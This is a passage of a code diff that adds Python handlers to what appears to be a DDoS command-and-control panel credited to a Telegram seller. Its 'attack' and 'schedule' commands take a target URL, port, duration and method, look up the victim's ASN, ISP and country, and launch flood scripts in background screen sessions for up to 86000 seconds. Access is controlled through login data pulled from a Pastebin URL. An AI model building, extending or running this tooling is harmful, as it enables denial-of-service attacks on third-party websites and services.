+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'refresh',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && pkill screen')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "attack" or sinput == "ATTACK":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                method = sin.split()[4]
+
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'all server api',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[1;37mLAUNCH ATTACK ON: \033[31m(\033[36m {waktu()} \033[31m)
+\033[31m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[31m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[1;36mATTACK - DETAILS\033[0m
+\033[31m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[1;37mSTATUS:  \033[31m(\033[32m ATTACK SENT SUCCESSFULLY ALL SERVERS\033[31m )
+\033[31m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀  \033[1;37mHOST:    \033[31m(\033[36m {url}\033[31m )
+\033[31m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀  \033[1;37mPORT:    \033[31m(\033[36m {port}\033[31m )
+\033[31m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀  \033[1;37mTIME:    \033[31m(\033[36m {duration}\033[31m )
+\033[31m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦  \033[1;37mMETHOD:  \033[31m(\033[36m api\033[31m )
+\033[31m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿ \033[48;5;15m\033[1;36mTARGET - DETAILS\033[0m
+\033[31m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿  \033[1;37mASN:     \033[31m(\033[36m {asn}\033[31m )
+\033[31m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿  \033[1;37mISP:     \033[31m(\033[36m {isp}\033[31m )
+\033[0m ⠀⠀⠀⣚⣻\033[31m⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀  \033[1;37mORG:     \033[31m(\033[36m {org}\033[31m )
+\033[0m ⣀⣀⣉⣩⣿⣿⣿\033[31m⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄  \033[1;37mCOUNTRY: \033[31m(\033[36m {country}\033[31m )
+\033[0m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻ \033[48;5;15m\033[1;36mCREDITS\033[0m
+\033[0m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿  \033[1;37mOWNER:   \033[31m(\033[36m @slxughhter\033[31m )
+\033[0m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀  \033[1;37mTELE:    \033[31m(\033[36m t.me/slxughhter\033[31m )
+\033[0m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀
+\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
+""")
+                    os.system(f'cd assets && screen -dm python3 api.py {url} {port} {duration} {method}')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) attack url port time method")
+                main()
+
+        elif sinput == "schedule" or sinput == "SCHEDULE":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                method = sin.split()[4]
+                schedule_time = sin.split()[5]
+
+                try:
+                    datetime.strptime(schedule_time, "%Y-%m-%d_%H:%M:%S")
+                except ValueError:
+                    print("(cnc) Wrong time format! Use: YYYY-MM-DD_HH:MM:SS")
+                    main()
+
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                print("attack successfully added to scheduled.json")
+
+                os.system(f'cd assets && screen -dm python3 sch.py {url} {port} {duration} {method} {schedule_time}')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) Incorrect format! Use: schedule <url> <port> <duration> <method> <schedule_time>")
+                main()
+
+        else:
+            print(f"(cnc) '{sinput}' There isn't any. Type 'help' to see commands")
+
+PASTEBIN_URL = "https://pastebin.com/raw/2DnwzaBt"
+login_data = read_login_data_from_pastebin(PASTEBIN_URL)
+
+if login_data is not None:
+    login(login_data)
